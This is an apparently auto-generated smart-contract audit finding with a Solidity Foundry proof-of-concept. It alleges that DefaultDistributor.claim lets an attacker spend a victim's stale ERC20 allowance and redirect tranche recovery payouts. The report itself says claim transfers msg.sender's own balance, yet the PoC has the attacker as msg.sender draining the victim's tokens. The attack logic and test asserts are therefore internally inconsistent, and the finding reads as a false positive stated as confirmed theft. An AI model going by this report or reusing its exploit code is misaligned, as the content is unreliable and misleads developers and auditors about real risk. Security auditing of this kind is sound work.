### Title
DefaultDistributor claim redirection lets residual allowances steal later-acquired tranche recoveries - ([File: contracts/DefaultDistributor.sol](contracts/DefaultDistributor.sol))

### Summary

`DefaultDistributor.claim` transfers the caller’s **entire current tranche balance** and pays the proportional recovery to an arbitrary `_to` address supplied by the caller. [1](#0-0) 

A user who retains ERC20 allowance after an earlier claim can later acquire more tranche tokens; any unprivileged attacker can then invoke `claim(attacker)`, consume the stale allowance, and receive the recovery owed to those tokens. [1](#0-0) 

### Finding Description

The distributor fixes the payout rate from its underlying balance and tranche total supply when claims are activated. [2](#0-1) 

Each successful claim calls `tranche.transferFrom(msg.sender, address(this), trancheBal)`, where `trancheBal` is the claimant’s full balance at execution time, and sends `trancheBal * rate / ONE_TRANCHE` underlying to `_to`. [1](#0-0) 

Because the payout recipient is independent of both the tranche owner and the account whose allowance is consumed, approval remains an authorization to transfer future balances but is treated as authorization to redirect their recovery proceeds. [3](#0-2) 

The contract assumes total supply is fixed after funding, but it does not assume ownership is fixed; a user can receive additional tranche tokens after previously granting a larger-than-current-balance or unlimited allowance. [4](#0-3) 

### Impact Explanation

An attacker can steal the full recovery payout attached to tranche tokens acquired by a victim after the victim’s earlier approval. [1](#0-0) 

In the PoC, the victim has a 100-token recovery claim, approves 200 tokens, claims once, and later receives 50 additional tranche tokens; the attacker uses the remaining allowance to transfer those 50 tokens and redirect the 50-underlying recovery. [1](#0-0) 

This is direct theft of recovery proceeds during the post-default finalized-claim phase, not merely a gas or availability issue. [2](#0-1) 

### Likelihood Explanation

The vulnerable sequence is possible whenever a claimant grants excess or unlimited ERC20 allowance and later obtains additional tranche tokens while the distributor remains active. [1](#0-0) 

Post-default tranches can remain transferable between holders, so a claimant can acquire tokens after an initial claim without any privileged participation. [4](#0-3) 

The attacker needs no privileged role and can monitor the public token for transfers to addresses with outstanding distributor allowance. [1](#0-0) 

### Recommendation

Send recovery proceeds to `msg.sender` instead of accepting an arbitrary `_to`, or require an explicit signed authorization from the tranche owner before paying a different receiver. [1](#0-0) 

Alternatively, accept a claim amount and consume only that amount of allowance, while still paying `msg.sender` by default. [1](#0-0) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "../contracts/DefaultDistributor.sol";

contract ClaimToken is ERC20 {
    constructor(string memory name_, string memory symbol_) ERC20(name_, symbol_) {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract DefaultDistributorClaimRedirectTest is Test {
    ClaimToken underlying;
    ClaimToken tranche;
    DefaultDistributor distributor;

    address victim = address(0xA11CE);
    address otherHolder = address(0xB0B);
    address attacker = address(0xBAD);

    function setUp() public {
        underlying = new ClaimToken("Underlying", "UND");
        tranche = new ClaimToken("Tranche", "TRN");
        distributor = new DefaultDistributor(
            address(underlying),
            address(tranche),
            address(this)
        );

        // Fixed post-default supply and funded recovery pool.
        tranche.mint(victim, 100e18);
        tranche.mint(otherHolder, 100e18);
        underlying.mint(address(distributor), 200e18);

        distributor.setIsActive(); // rate == 1 underlying per tranche
    }

    function testResidualAllowanceRedirectsLaterRecovery() public {
        // Victim grants excess allowance, as with a conventional max approval,
        // and claims the currently held 100-token recovery.
        vm.startPrank(victim);
        tranche.approve(address(distributor), 200e18);
        distributor.claim(victim);
        vm.stopPrank();

        assertEq(underlying.balanceOf(victim), 100e18);
        assertEq(tranche.allowance(victim, address(distributor)), 100e18);

        // Victim later acquires another 50 tranche tokens while claims are active.
        vm.prank(otherHolder);
        tranche.transfer(victim, 50e18);

        // The attacker consumes the stale allowance and redirects the new claim.
        vm.prank(attacker);
        distributor.claim(attacker);

        assertEq(tranche.balanceOf(victim), 0);
        assertEq(tranche.balanceOf(address(distributor)), 150e18);
        assertEq(underlying.balanceOf(attacker), 50e18);
        assertEq(underlying.balanceOf(victim), 100e18);
    }
}
```
